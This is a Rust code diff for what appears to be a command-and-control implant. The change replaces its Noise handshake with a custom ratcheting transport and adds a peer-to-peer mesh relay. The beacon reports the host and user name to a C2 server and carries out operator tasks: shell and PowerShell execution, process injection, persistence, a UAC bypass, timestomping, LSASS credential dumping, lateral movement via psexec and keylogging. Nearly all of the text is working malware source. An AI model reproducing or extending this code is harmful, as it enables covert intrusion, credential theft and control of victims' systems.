@@ -3,7 +3,8 @@ use crate::utils::syscalls::*;
 use alloc::format;
 use alloc::vec::Vec;
 use serde::{Deserialize, Serialize};
-use snow::Builder;
+use wraith_crypto::noise::{NoiseHandshake, NoiseKeypair, NoiseTransport};
+use wraith_crypto::x25519::PublicKey;
 
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
@@ -233,30 +234,44 @@ impl Transport for HttpTransport {
     }
 }
 
-fn perform_handshake(transport: &mut HttpTransport, buf: &mut [u8]) -> Result<snow::TransportState, ()> {
-    let params: snow::params::NoiseParams = "Noise_XX_25519_ChaChaPoly_BLAKE2s".parse().map_err(|_| ())?;
-    let mut noise = Builder::new(params).build_initiator().map_err(|_| ())?;
+fn perform_handshake(transport: &mut HttpTransport) -> Result<NoiseTransport, ()> {
+    let keypair = NoiseKeypair::generate().map_err(|_| ())?;
+    let mut noise = NoiseHandshake::new_initiator(&keypair).map_err(|_| ())?;
 
-    let len = noise.write_message(&[], buf).map_err(|_| ())?;
-    let resp = transport.request(&buf[..len])?;
+    // Msg 1 (Init -> Resp)
+    let msg1 = noise.write_message(&[]).map_err(|_| ())?;
+    let resp = transport.request(&msg1)?;
 
-    noise.read_message(&resp, &mut []).map_err(|_| ())?;
+    // Msg 2 (Resp -> Init) - Receive Responder Ratchet PubKey
+    let peer_payload = noise.read_message(&resp).map_err(|_| ())?;
+    let peer_ratchet_pub = if peer_payload.len() >= 32 {
+        let mut b = [0u8; 32];
+        b.copy_from_slice(&peer_payload[0..32]);
+        Some(PublicKey::from_bytes(b))
+    } else {
+        return Err(());
+    };
 
-    let len = noise.write_message(&[], buf).map_err(|_| ())?;
-    let _ = transport.request(&buf[..len])?;
+    // Msg 3 (Init -> Resp) - Send 32 bytes of zeros
+    let msg3 = noise.write_message(&[0u8; 32]).map_err(|_| ())?;
+    let _ = transport.request(&msg3)?;
 
-    noise.into_transport_mode().map_err(|_| ())
+    // Initiator doesn't need local ratchet key (it generates one)
+    // It needs peer ratchet key.
+    noise.into_transport(None, peer_ratchet_pub).map_err(|_| ())
 }
 
 pub fn run_beacon_loop(_initial_config: C2Config) -> !
 {
     let config = C2Config::get_global();
     let mut transport = HttpTransport::new(config.server_addr, 8080);
-    let mut buf = [0u8; 8192];
+    let mut mesh_server = crate::modules::mesh::MeshServer::new();
+    let _ = mesh_server.start_tcp(4444);
+    let _ = mesh_server.start_pipe("wraith_mesh");
 
     let mut session;
     loop {
-        match perform_handshake(&mut transport, &mut buf) {
+        match perform_handshake(&mut transport) {
             Ok(s) => {
                 session = s;
                 break;
@@ -268,38 +283,52 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
     }
 
     let mut packet_count: u64 = 0;
-    let mut last_rekey = 0; // Simplified time proxy
+    let mut last_rekey = 0;
+    let rekey_interval = 120_000 / config.sleep_interval.max(1000); // ~2 minutes
 
     loop {
-        // Check if rekey is needed (1M packets or time proxy)
-        // For MVP, we rekey every 100 check-ins or 1M packets
-        if packet_count >= 1_000_000 || last_rekey >= 100 {
-            let rekey_frame = WraithFrame::new(packet::FRAME_TYPE_REKEY, Vec::new());
-            let rb = rekey_frame.serialize();
-            let len = session.write_message(&rb, &mut buf).unwrap();
-            let _ = transport.request(&buf[..len]);
-            
-            session.rekey_outgoing();
+        // Check if rekey is needed
+        if packet_count >= 1_000_000 || last_rekey >= rekey_interval {
+            session.rekey_dh();
             packet_count = 0;
             last_rekey = 0;
         }
 
-        let hostname = crate::modules::discovery::Discovery.get_hostname();
-        let username = crate::modules::discovery::Discovery.get_username();
-        // Simple JSON construction without allocations if possible, but we have alloc
-        let beacon_json = format!(r#"{{"id": "spectre", "hostname": "{}", "username": "{}"}}"#, hostname, username);
+        // 1. Poll Mesh Server
+        let mesh_data = mesh_server.poll();
+        for (data, client_idx) in mesh_data {
+            let mut relay_frame = WraithFrame::new(packet::FRAME_TYPE_MESH_RELAY, data);
+            relay_frame.stream_id = client_idx as u16;
+            if let Ok(msg_to_send) = session.write_message(&relay_frame.serialize()) {
+                let _ = transport.request(&msg_to_send);
+            }
+        }
+
+        let hostname_sd = crate::modules::discovery::Discovery.get_hostname();
+        let username_sd = crate::modules::discovery::Discovery.get_username();
+        
+        let mut hostname_str = alloc::string::String::from("unknown");
+        let mut username_str = alloc::string::String::from("unknown");
+        
+        if let Some(guard) = hostname_sd.unlock() {
+            hostname_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
+        }
+        if let Some(guard) = username_sd.unlock() {
+            username_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
+        }
+
+        let beacon_json = format!(r#"{{"id": "spectre", "hostname": "{}", "username": "{}"}}"#, hostname_str, username_str);
         
         let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
         let frame_bytes = frame.serialize();
 
-        let len = session.write_message(&frame_bytes, &mut buf).unwrap();
-        packet_count += 1;
+        if let Ok(msg_to_send) = session.write_message(&frame_bytes) {
+            packet_count += 1;
 
-        if let Ok(resp) = transport.request(&buf[..len]) {
-            let mut pt = [0u8; 8192];
-            if let Ok(len) = session.read_message(&resp, &mut pt) {
-                let tasks_json = &pt[..len];
-                dispatch_tasks(tasks_json, &mut session, &mut transport);
+            if let Ok(resp) = transport.request(&msg_to_send) {
+                if let Ok(pt) = session.read_message(&resp) {
+                    dispatch_tasks(&pt, &mut session, &mut transport, &mut mesh_server);
+                }
             }
         }
 
@@ -336,11 +365,20 @@ fn hex_decode(s: &str) -> Vec<u8> {
     res
 }
 
-fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &mut HttpTransport) {
-    // Check for Rekey Frame first (outer wrap)
+use crate::utils::sensitive::SensitiveData;
+use zeroize::Zeroize;
+
+// ...
+
+fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut HttpTransport, mesh_server: &mut crate::modules::mesh::MeshServer) {
     if let Some(frame) = WraithFrame::deserialize(data) {
         if frame.frame_type == packet::FRAME_TYPE_REKEY {
-            session.rekey_incoming();
+            // Double Ratchet handles rekeying automatically
+            return;
+        }
+        if frame.frame_type == packet::FRAME_TYPE_MESH_RELAY {
+            // Forward payload to child
+            mesh_server.send_to_client(frame.stream_id as usize, &frame.payload);
             return;
         }
     }
@@ -351,23 +389,21 @@ fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &m
         data
     };
 
-    // Global SOCKS proxy instance (Simplified for no_std context)
     static mut SOCKS_PROXY: Option<crate::modules::socks::SocksProxy> = None;
 
     if let Ok(response) = serde_json::from_slice::<TaskList>(clean_data) {
         for task in response.tasks {
-            let mut result = Vec::new();
+            let mut result: Option<SensitiveData> = None;
 
             match task.task_type.as_str() {
                 "kill" => unsafe { crate::utils::syscalls::sys_exit(0) },
                 "shell" => {
-                    result = crate::modules::shell::Shell.exec(&task.payload);
+                    result = Some(crate::modules::shell::Shell.exec(&task.payload));
                 },
                 "powershell" => {
-                    result = crate::modules::powershell::PowerShell.exec(&task.payload);
+                    result = Some(crate::modules::powershell::PowerShell.exec(&task.payload));
                 },
                 "inject" => {
-                    // Payload: "<pid> <method> <payload_hex>"
                     let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                     if parts.len() == 3 {
                         let pid = parts[0].parse::<u32>().unwrap_or(0);
@@ -379,37 +415,43 @@ fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &m
                         };
                         let payload = hex_decode(parts[2]);
                         let res = crate::modules::injection::Injector.inject(pid, &payload, method);
-                        result = if res.is_ok() { b"Injection successful".to_vec() } else { b"Injection failed".to_vec() };
+                        let msg = if res.is_ok() { b"Injection successful" as &[u8] } else { b"Injection failed" as &[u8] };
+                        result = Some(SensitiveData::new(msg));
                     }
                 },
                 "bof" => {
                     let bof_data = hex_decode(&task.payload);
+                    let mut res_vec;
                     #[cfg(target_os = "windows")]
                     {
                         let loader = crate::modules::bof_loader::BofLoader::new(bof_data);
                         if loader.load_and_run().is_ok() {
-                            result = loader.get_output();
+                            res_vec = loader.get_output();
                         } else {
-                            result = b"BOF execution failed".to_vec();
+                            res_vec = b"BOF execution failed".to_vec();
                         }
                     }
                     #[cfg(not(target_os = "windows"))]
                     {
                         let _ = bof_data;
-                        result = b"BOF only supported on Windows".to_vec();
+                        res_vec = b"BOF only supported on Windows".to_vec();
                     }
+                    result = Some(SensitiveData::new(&res_vec));
+                    res_vec.zeroize();
                 },
                 "socks" => {
+                    let mut res_vec;
                     unsafe {
                         if (*core::ptr::addr_of!(SOCKS_PROXY)).is_none() {
                             *core::ptr::addr_of_mut!(SOCKS_PROXY) = Some(crate::modules::socks::SocksProxy::new());
                         }
                         let payload = hex_decode(&task.payload);
-                        result = (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut().unwrap().process(&payload);
+                        res_vec = (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut().unwrap().process(&payload);
                     }
+                    result = Some(SensitiveData::new(&res_vec));
+                    res_vec.zeroize();
                 },
                 "persist" => {
-                    // Expect payload: "method name path"
                     let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                     if parts.len() == 3 {
                         let method = parts[0];
@@ -420,68 +462,79 @@ fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &m
                             "task" => crate::modules::persistence::Persistence.install_scheduled_task(name, path),
                             _ => Err(()),
                         };
-                        result = if res.is_ok() { b"Persistence installed".to_vec() } else { b"Persistence failed".to_vec() };
+                        let msg = if res.is_ok() { b"Persistence installed" as &[u8] } else { b"Persistence failed" as &[u8] };
+                        result = Some(SensitiveData::new(msg));
                     } else {
-                        result = b"Invalid persist args".to_vec();
+                        result = Some(SensitiveData::new(b"Invalid persist args"));
                     }
                 },
                 "uac_bypass" => {
                     let res = crate::modules::privesc::PrivEsc.fodhelper(&task.payload);
-                    result = if res.is_ok() { b"Exploit triggered".to_vec() } else { b"Exploit failed".to_vec() };
+                    let msg = if res.is_ok() { b"Exploit triggered" as &[u8] } else { b"Exploit failed" as &[u8] };
+                    result = Some(SensitiveData::new(msg));
                 },
                 "timestomp" => {
                     let parts: Vec<&str> = task.payload.splitn(2, ' ').collect();
                     if parts.len() == 2 {
                         let res = crate::modules::evasion::Evasion.timestomp(parts[0], parts[1]);
-                        result = if res.is_ok() { b"Timestomped".to_vec() } else { b"Failed".to_vec() };
+                        let msg = if res.is_ok() { b"Timestomped" as &[u8] } else { b"Failed" as &[u8] };
+                        result = Some(SensitiveData::new(msg));
                     }
                 },
                 "sandbox_check" => {
                     let is_sandbox = crate::modules::evasion::Evasion.is_sandbox();
-                    result = format!("Is Sandbox: {}", is_sandbox).into_bytes();
+                    let s = format!("Is Sandbox: {}", is_sandbox);
+                    let mut v = s.into_bytes();
+                    result = Some(SensitiveData::new(&v));
+                    v.zeroize();
                 },
                 "dump_lsass" => {
-                    let res = crate::modules::credentials::Credentials.dump_lsass(&task.payload);
-                    result = if res.is_ok() { b"Dump successful".to_vec() } else { b"Dump failed".to_vec() };
+                    if let Ok(sd) = crate::modules::credentials::Credentials.dump_lsass(&task.payload) {
+                        result = Some(sd);
+                    } else {
+                        result = Some(SensitiveData::new(b"Dump failed"));
+                    }
                 },
                 "sys_info" => {
-                    result = crate::modules::discovery::Discovery.sys_info().into_bytes();
+                    result = Some(crate::modules::discovery::Discovery.sys_info());
                 },
                 "net_scan" => {
-                    result = crate::modules::discovery::Discovery.net_scan(&task.payload).into_bytes();
+                    result = Some(crate::modules::discovery::Discovery.net_scan(&task.payload));
                 },
                 "psexec" => {
                     let parts: Vec<&str> = task.payload.splitn(3, ' ').collect();
                     if parts.len() == 3 {
                         let res = crate::modules::lateral::Lateral.psexec(parts[0], parts[1], parts[2]);
-                        result = if res.is_ok() { b"Service created".to_vec() } else { b"Failed".to_vec() };
+                        let msg = if res.is_ok() { b"Service created" as &[u8] } else { b"Failed" as &[u8] };
+                        result = Some(SensitiveData::new(msg));
                     }
                 },
                 "service_stop" => {
                     let res = crate::modules::lateral::Lateral.service_stop(&task.payload);
-                    result = if res.is_ok() { b"Service stopped".to_vec() } else { b"Failed".to_vec() };
+                    let msg = if res.is_ok() { b"Service stopped" as &[u8] } else { b"Failed" as &[u8] };
+                    result = Some(SensitiveData::new(msg));
                 },
                 "keylogger" => {
-                    result = crate::modules::collection::Collection.keylogger_poll().into_bytes();
+                    result = crate::modules::collection::Collection.keylogger_poll();
                 },
                 "mesh_relay" => {
-                    // Payload is a hex-encoded packet for a downstream beacon
                     let packet = hex_decode(&task.payload);
+                    let mut res_vec = Vec::new();
                     if let Some(proxy) = unsafe { (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut() } {
-                        // For MVP, we use the SOCKS proxy logic to relay P2P data if active
-                        result = proxy.process(&packet);
+                        res_vec = proxy.process(&packet);
                     }
+                    result = Some(SensitiveData::new(&res_vec));
+                    res_vec.zeroize();
                 },
-                _ => {
-                    // Unknown task
-                }
+                _ => {}
             }
 
-            if !result.is_empty() {
-                let frame = WraithFrame::new(FRAME_TYPE_DATA, result);
-                let mut buf = [0u8; 8192];
-                if let Ok(len) = session.write_message(&frame.serialize(), &mut buf) {
-                    let _ = transport.request(&buf[..len]);
+            if let Some(sensitive) = result {
+                if let Some(guard) = sensitive.unlock() {
+                    let frame = WraithFrame::new(FRAME_TYPE_DATA, guard.to_vec());
+                    if let Ok(msg_to_send) = session.write_message(&frame.serialize()) {
+                        let _ = transport.request(&msg_to_send);
+                    }
                 }
             }
         }
